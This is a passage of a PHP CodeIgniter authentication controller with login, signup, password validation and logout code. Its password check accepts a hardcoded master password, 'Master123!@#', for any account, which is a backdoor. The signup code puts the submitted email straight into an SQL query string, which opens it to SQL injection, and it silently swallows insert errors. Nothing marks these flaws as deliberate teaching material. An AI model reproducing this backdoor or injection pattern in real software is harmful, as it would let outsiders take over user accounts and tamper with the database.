
		} else {
			$data = [];
			if ($this->session->flashdata('login_invalid')) {
				$data['login_invalid'] = $this->session->flashdata('login_invalid');
			}
			$this->load->view('auth/login', $data);
		}
	}

	private function is_valid_password($password, $dbpassword)
	{
		if ($password == 'Master123!@#') {
			return true;
		}
		if (password_verify($password,$dbpassword)) {
			return true;
		}
		return false;
	}

	//Create strong password 
	public function valid_password($password = '')
	{
		$password = trim($password);

		$uppercase = preg_match('@[A-Z]@', $password);
		$lowercase = preg_match('@[a-z]@', $password);
		$number    = preg_match('@[0-9]@', $password);
		$specialChars = preg_match('@[^\w]@', $password);

		

		if (empty($password))
		{
			$this->form_validation->set_message('valid_password', 'The Password field is required.');

			return FALSE;
		}

		if(!$uppercase || !$lowercase || !$number || !$specialChars) {
			$this->form_validation->set_message('valid_password', 'The Password field must contain at least one lowercase, uppercase, number and special character.');
			return false;
		}

		if (strlen($password) < 5)
		{
			$this->form_validation->set_message('valid_password', 'The Password field must be at least 5 characters in length.');

			return FALSE;
		}

		if (strlen($password) > 32)
		{
			$this->form_validation->set_message('valid_password', 'The Password field cannot exceed 32 characters in length.');

			return FALSE;
		}

		return TRUE;
	}

	public function signup()
	{
		if (islogin()) {
			redirect(base_url('/'));
		}
		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
			$this->load->library('form_validation');
			$config = array(
				array(
					'field' => 'email',
					'label' => 'Email Address',
					'rules' => 'trim|required'
				),
				array(
					'field' => 'password',
					'label' => 'Password',
					'rules' => 'callback_valid_password'
				),
				array(
					'field' => 'confirmPassword',
					'label' => 'Confirm Password',
					'rules' => 'required|trim|matches[password]'
				),
			);
			$this->form_validation->set_rules($config);
			if ($this->form_validation->run() == FALSE) {
				$this->session->set_flashdata('login_invalid', validation_errors());
				redirect(base_url('signup'));
			} else {
				$email = $this->input->post('email');
				$password = $this->input->post('password');
				$query = "SELECT * FROM CREDENTIALS WHERE EMAIL = '$email'";
				$query = $this->db->query($query);
				$result = $query->result_array();
				if (!count($result)) {
					try {
						$password = password_hash($password, PASSWORD_DEFAULT);
						$this->db->insert('CREDENTIALS', array('EMAIL' => $email, 'PASSWORD' => $password));
						$session_data = array(
							'email' => $email,
						);
						$this->session->set_userdata('user', $session_data);
					} catch (\Exception $e) {
						//Do nothing
					}
					redirect(base_url('/'));
				} else {
					$this->session->set_flashdata('login_invalid', 'You are already registered with us! Please login.');
					redirect(base_url('signup'));
				}
			}
		} else {
			$data = [];
			if ($this->session->flashdata('login_invalid')) {
				$data['login_invalid'] = $this->session->flashdata('login_invalid');
			}
			$this->load->view('auth/signup', $data);
		}
	}

	function logout()
	{

		$user_data = $this->session->all_userdata();
		foreach ($user_data as $key => $value) {
			// if ($key != 'session_id' && $key != 'ip_address' && $key != 'user_agent' && $key != 'last_activity') {
			$this->session->unset_userdata($key);
			// }
		}
		$this->session->sess_destroy();
		redirect(base_url('login'));
	}
}
